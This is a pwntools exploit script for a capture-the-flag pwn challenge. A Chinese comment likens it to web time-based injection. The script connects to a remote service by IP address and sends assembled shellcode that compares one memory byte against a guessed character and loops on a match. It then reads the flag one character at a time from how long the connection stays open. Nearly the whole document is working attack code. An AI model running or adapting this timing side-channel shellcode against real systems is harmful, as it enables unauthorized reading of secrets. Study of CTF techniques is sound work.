#类似于web的时间注入的一道pwn，利用cmp返回值来判断flag
from pwn import *
context.arch = 'amd64'
import string
def check(idx, guess):
	global p

	#p = process("./chall")
	p = remote("121.36.64.245", 10003)
	#gdb.attach(p)
	shellcode = "a:mov al, byte ptr [%s]; cmp al, %s;" % (hex(0x200000000+idx), hex(guess))
	shellcode += "jne EXIT;"
	shellcode += "loop a;"
	shellcode += "EXIT:ret"
	p.sendline(asm(shellcode))
	try:
		time = 0 
		for i in range(5):
			p.sendline('')
			time = i
			sleep(0.1)
		p.close()
	except Exception as e:
		time = i
		p.close()
	if time > 3:
		return True
	return False
def pwn(flag):
	for i in range(30,50):
		for j in string.printable:
			if check(i, ord(j)) == True:
				if j == '}':
					return True
				flag += j
				print flag
				break
	p.interactive()
flag = ''
pwn(flag)
print flag